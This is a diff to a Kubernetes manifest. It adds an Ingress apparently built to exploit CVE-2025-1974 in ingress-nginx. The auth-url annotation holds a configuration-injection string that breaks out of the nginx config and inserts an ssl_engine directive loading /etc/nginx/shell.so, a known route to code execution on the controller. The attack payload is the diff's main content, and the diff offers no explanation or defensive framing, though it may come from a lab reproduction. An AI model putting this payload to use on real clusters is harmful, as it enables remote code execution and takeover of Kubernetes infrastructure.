@@ -94,3 +94,23 @@ spec:
                 name: ingress-nginx-controller-admission
                 port:
                   number: 443
+---
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: cve-2025-1974-ingress
+  namespace: nginx
+  annotations:
+    nginx.ingress.kubernetes.io/auth-url: "http://example.com#;}}}\nssl_engine /etc/nginx/shell.so;\n"
+spec:
+  rules:
+    - host: nginx-cve.nhatanhweb.website
+      http:
+        paths:
+          - path: /
+            pathType: Prefix
+            backend:
+              service:
+                name: nginx-service
+                port:
+                  number: 80
